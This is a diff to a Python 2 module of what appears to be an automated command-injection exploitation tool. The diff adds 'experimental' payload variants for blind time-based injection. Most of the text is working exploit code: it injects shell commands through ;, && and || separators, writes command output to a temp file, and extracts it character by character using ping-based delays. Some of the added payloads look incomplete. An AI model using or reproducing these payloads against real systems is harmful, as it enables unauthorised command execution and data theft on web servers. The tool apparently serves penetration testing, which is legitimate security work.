@@ -34,7 +34,7 @@ from src.core.requests import parameters
  __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
 """
 
-def exploitation(url,delay,filename,tmp_file,http_request_method):
+def exploitation(url,delay,filename,http_request_method):
   
   counter = 0
   vp_flag = True
@@ -58,7 +58,7 @@ def exploitation(url,delay,filename,tmp_file,http_request_method):
   if menu.options.url_reload == True:
     print colors.RED + "(x) Error: The '--url-reload' option is not available in "+ technique +"!" + colors.RESET
 
-  sys.stdout.write( "(*) Testing the "+ technique +"... ")
+  sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... " + colors.RESET)
   sys.stdout.flush()
 
   for prefix in settings.PREFIXES:
@@ -86,11 +86,13 @@ def exploitation(url,delay,filename,tmp_file,http_request_method):
 	  B64_DEC_TRICK = ""
 	  
 	# The output file for file-based injection technique.
-	OUTPUT_TEXTFILE = tmp_file + B64_ENC_TAG + ".txt"
+	OUTPUT_TEXTFILE = settings.TMP_DIR + B64_ENC_TAG + ".txt"
 	
 	tag_length = len(TAG) + 4
 	for j in range(1,int(tag_length)):
+	  
 	  try:
+	    
 	    if seperator == ";" :
 	      payload = (seperator + " "
 			"str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + seperator + " "
@@ -102,25 +104,56 @@ def exploitation(url,delay,filename,tmp_file,http_request_method):
 			"else sleep " + str(delay) + seperator + " "
 			"fi "
 			)
-			
+	      #-----------------------------------------------------------------------------------------
+	      #  __Warning__: This (alternative) python-shell is still experimental.
+	      #-----------------------------------------------------------------------------------------
+	      payload = (seperator + " "
+			"str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + seperator + " "
+			# Find the length of the output, using readline().
+			"str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ seperator + " "
+			"if [ \"" + str(j) + "\" -ne ${str1} ]" + seperator  + " "
+			"then echo 0" + seperator + " "
+			"else ping -c"+ str(delay+1) +" 127.0.0.1  " + seperator + " "
+			"fi "
+			)
+	      #-----------------------------------------------------------------------------------------
 	    elif seperator == "&&" :
 	      payload = (urllib.quote('&') + " " +
 			"sleep 0 " + urllib.quote(seperator) + " "
 			"str=$(echo "+ TAG + " > " + OUTPUT_TEXTFILE + ")" + urllib.quote(seperator) + " "
 			"str=$(cat " + OUTPUT_TEXTFILE + ")" + urllib.quote(seperator) + " "
-			# Find the length of the output.
 			"str1=${#str}" + urllib.quote(seperator) + " "
 			"[ " + str(j) + " -eq ${str1} ]" + urllib.quote(seperator) + " "
 			"sleep 1 "
 			)
-
+	      #-----------------------------------------------------------------------------------------
+	      #  __Warning__: This (alternative) python-shell is still experimental.
+	      #-----------------------------------------------------------------------------------------
+	      payload = (urllib.quote('&') + " " +
+			"echo 0 " + urllib.quote(seperator) + " "
+			"str=$(echo "+ TAG + " > " + OUTPUT_TEXTFILE + ")" + urllib.quote(seperator) + " "
+			# Find the length of the output, using readline().
+			"str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + urllib.quote(seperator) + " "
+			"[ " + str(j) + " -eq ${str1} ]" + urllib.quote(seperator) + " "
+			"ping -c"+ str(delay+1) +" 127.0.0.1  " + seperator + " "
+			)
+	      #-----------------------------------------------------------------------------------------
 	    elif seperator == "||" :
 	      payload = (seperator + " "
 			"echo '" + TAG + "' > " + OUTPUT_TEXTFILE + " | "+ 
 			"[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | wc -c) ] " + seperator + " "
 			"sleep " + str(delay)
 			)  
-	      
+	      ##-----------------------------------------------------------------------------------------
+	      ##  __Warning__: This (alternative) python-shell is still experimental.
+	      ##-----------------------------------------------------------------------------------------
+	      payload = (seperator + " "
+			"echo '" + TAG + "' > " + OUTPUT_TEXTFILE + " | "+ 
+			# Find the length of the output, using readline().
+			"[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + seperator + " "
+			"echo 0 | ping -c"+ str(delay+1) +" 127.0.0.1  "
+			) 
+	      ##-----------------------------------------------------------------------------------------
 	    else:
 	      pass
 
@@ -328,7 +361,20 @@ def exploitation(url,delay,filename,tmp_file,http_request_method):
 				  "else sleep " + str(delay) + seperator +
 				  "fi "
 				  )
-				  
+			#-----------------------------------------------------------------------------------------
+			#  __Warning__: This (alternative) python-shell is still experimental.
+			#-----------------------------------------------------------------------------------------
+			payload = (seperator + " "
+				  "str=$("+ cmd + "| tr '\n' ' ' > " + OUTPUT_TEXTFILE + ")" + seperator + " "
+				  # Find the length of the output, using readline().
+				  "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ seperator + " "
+				  "if [ \"" + str(j) + "\" != ${str1} ]; " +
+				  "then sleep 0 " + seperator +
+				  "else ping -c"+ str(delay+1) +" 127.0.0.1  " + seperator + " "
+				  "fi "
+				  )
+			#-----------------------------------------------------------------------------------------
+			
 		      if seperator == "&&" :
 			payload = (urllib.quote('&') + " " +
 				  "sleep 0 " + urllib.quote(seperator) + " "
@@ -339,14 +385,35 @@ def exploitation(url,delay,filename,tmp_file,http_request_method):
 				  "[ " + str(j) + " -eq ${str1} ]" + urllib.quote(seperator) + " "
 				  "sleep 1 "
 				  )
-	    
+	    		#-----------------------------------------------------------------------------------------
+			#  __Warning__: This (alternative) python-shell is still experimental.
+			#-----------------------------------------------------------------------------------------
+			payload = (urllib.quote('&') + " " +
+				  "echo 0 " + urllib.quote(seperator) + " "
+				  "str=$(\""+cmd+"\"| tr '\n' ' ' > " + OUTPUT_TEXTFILE +") " + urllib.quote(seperator) + " "
+				  # Find the length of the output, using readline().
+				  "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")" + urllib.quote(seperator) + " "
+				  "[ " + str(j) + " -eq ${str1} ]" + urllib.quote(seperator) + " "
+				  "ping -c"+ str(delay+1) +" 127.0.0.1  " + seperator + " "
+				  )
+			#-----------------------------------------------------------------------------------------
+			
 		      if seperator == "||" :		
 			payload = (seperator + " "
 				  "echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " | "+ 
 				  "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | wc -c) ] " + seperator + " "
 				  "sleep " + str(delay)
 				  ) 
-
+			#-----------------------------------------------------------------------------------------
+			#  __Warning__: This (alternative) python-shell is still experimental.
+			#-----------------------------------------------------------------------------------------
+			payload = (seperator + " "
+				  "echo $(" + cmd + ") | tr '\n' ' '> " + OUTPUT_TEXTFILE + " | "+ 
+				  # Find the length of the output, using readline().
+				  "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + seperator + " "
+				  "echo 0 | ping -c"+ str(delay+1) +" 127.0.0.1  "
+				  ) 
+			
 		      # Check if defined "--prefix" option.
 		      if menu.options.prefix:
 			prefix = menu.options.prefix
@@ -452,7 +519,7 @@ def exploitation(url,delay,filename,tmp_file,http_request_method):
 			break
 				
 		    i = j + 1
-		    print "(*) Grabbing the output from " + OUTPUT_TEXTFILE + "... (This will take a while!) \n"
+		    print "(*) Grabbing the output from '" + OUTPUT_TEXTFILE + "'... (This will take a while!) \n"
 		    check_start = 0
 		    check_end = 0
 		    check_start = time.time()
@@ -460,7 +527,7 @@ def exploitation(url,delay,filename,tmp_file,http_request_method):
 		    output = []
 		    for i in range(1,int(i)):
 		      for ascii_char in range(32, 129):
-			
+
 			if seperator == ";" :
 			  payload = (seperator + " "
 				    "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + seperator +
@@ -469,7 +536,18 @@ def exploitation(url,delay,filename,tmp_file,http_request_method):
 				    "else sleep " + str(delay) + seperator +
 				    "fi "
 				    )
-
+			  #-----------------------------------------------------------------------------------------
+			  #  __Warning__: This (alternative) python-shell is still experimental.
+			  #-----------------------------------------------------------------------------------------
+			  payload = (seperator + " "
+				    "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);sys.exit(0)\")" + seperator +
+				    "if [ \"" + str(ascii_char) + "\" != ${str} ]" + seperator +
+				    "then echo 0" + seperator +
+				    "else ping -c2 " + seperator +
+				    "fi "
+				    )
+			  #-----------------------------------------------------------------------------------------
+			  
 			if seperator == "&&" :
 			  payload = (urllib.quote('&') + " " +
 				    "sleep 0 " + urllib.quote(seperator) + " "
@@ -477,14 +555,33 @@ def exploitation(url,delay,filename,tmp_file,http_request_method):
 				    "[ " + str(ascii_char) + " -eq ${str} ]" + urllib.quote(seperator) + " "
 				    "sleep 1 "
 				    )
-
+			  #-----------------------------------------------------------------------------------------
+			  #  __Warning__: This (alternative) python-shell is still experimental.
+			  #-----------------------------------------------------------------------------------------
+			  payload = (urllib.quote('&') + " " +
+				    "echo 0 " + urllib.quote(seperator) + " "
+				    "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);sys.exit(0)\")" + urllib.quote(seperator) + " "
+				    "[ " + str(ascii_char) + " -eq ${str} ]" + urllib.quote(seperator) + " "
+				    "ping -c"+ str(delay+1) +" 127.0.0.1 "
+				    )
+			  #-----------------------------------------------------------------------------------------
+			  
 			if seperator == "||" :
 			  payload = (seperator + " "
 				    "echo '" + TAG + "' |"+
 				    "[ \"" + str(ascii_char) + "\" -ne  $(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + seperator + 
 				    "sleep " + str(delay) + " "
 				    )
-			  
+			  #-----------------------------------------------------------------------------------------
+			  #  __Warning__: This (alternative) python-shell is still experimental.
+			  #-----------------------------------------------------------------------------------------
+			  payload = (seperator + " "
+				    "echo '" + TAG + "' |"+
+				    "[ \"" + str(ascii_char) + "\" -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);sys.exit(0)\") ] " + seperator + 
+				    "echo 0 | ping -c"+ str(delay+1) +" 127.0.0.1  "
+				    )
+			 #-----------------------------------------------------------------------------------------
+			 
 			# Check if defined "--prefix" option.
 			if menu.options.prefix:
 			  prefix = menu.options.prefix
@@ -592,7 +689,7 @@ def exploitation(url,delay,filename,tmp_file,http_request_method):
 		    
 		except KeyboardInterrupt: 
 		  print ""
-		  sys.exit(0)
+		  sys.exit(1)
 
 	    else:
 	      print "(*) Continue testing the "+ technique +"... "
